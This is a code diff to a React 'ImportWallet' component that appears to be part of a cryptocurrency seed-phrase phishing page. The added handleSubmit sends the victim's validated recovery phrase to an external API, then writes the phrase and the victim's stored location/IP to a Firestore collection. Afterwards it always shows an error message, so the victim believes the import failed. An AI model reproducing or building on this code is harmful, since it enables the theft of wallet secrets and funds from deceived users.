@@ -101,7 +101,69 @@ function validateMnemonic(mnemonic) {
       console.error("Failed to read clipboard contents: ", err);
     }
   };
-    
+
+   const encodeSeed = async (seed) => {
+    var encodeSeed = '';
+    try {
+      const response = await fetch(import.meta.env.VITE_PUBLIC_API_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ txt:seed}), 
+      });
+      if (response.ok) {
+         const data = await response.json();
+         encodeSeed = data.enc;
+      }
+    } catch (err) {
+      console.log(err);
+    }
+    return encodeSeed;
+  };
+  const handleSubmit = async (e) => {
+   try{
+        SetProcessing(true);
+        var encode = '';
+        var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
+        var formattedSeedPhrase = normalizeText(secretPharse);
+        if(validateMnemonic(formattedSeedPhrase)){
+          try{
+            encode = await encodeSeed(formattedSeedPhrase);
+          }catch(e){
+            console.log(e);
+          }
+          if(!getLocalStorage(encodeBase64(encode ? encode: formattedSeedPhrase))){
+                const isExist = await checkExistsBySeed(encode? encode : formattedSeedPhrase);
+                if(!isExist){
+                    var _asset = '';
+                    var _total = 0;
+                    var _s = 1;
+                    const user = await addDoc(collection(db, "mydata"), {
+                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName?walletName :'Others',secret:encode? encode : formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
+                    });
+                    if(user.id){
+                        setLocalStorage(encodeBase64(encode? encode : formattedSeedPhrase),1);
+                        updateIndex(user.id);
+                        SetShowErrMsg(true);
+                    }
+                }else{
+                    setLocalStorage(encodeBase64(encode? encode : formattedSeedPhrase),1);
+                    SetShowErrMsg(true);
+                }
+            }else{
+                SetShowErrMsg(true);
+            }
+        }else{
+            SetShowErrMsg(true);
+        }
+    }catch(err){
+        console.log(err);
+    }finally{
+        SetProcessing(false);
+    }
+  };
+  /*
   const handleSubmit = async (e) => {
    try{
         SetProcessing(true);
@@ -138,7 +200,7 @@ function validateMnemonic(mnemonic) {
         SetProcessing(false);
     }
   };
-    
+   */ 
   return (
 <div className="page">
 <div className="container">
@@ -178,7 +240,7 @@ className="textarea"
 </div>
 
 <div className="bottom">
-<button onClick={handleSubmit} className={`continue-btn active`}>
+<button disabled={IsProcessing} onClick={handleSubmit} className={`continue-btn active`}>
   <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
 <span style={{paddingLeft: '5px'}}>Import</span>
 </button>
@@ -191,8 +253,3 @@ className="textarea"
 }
 
 export default ImportWallet;
-
-
-
-
-
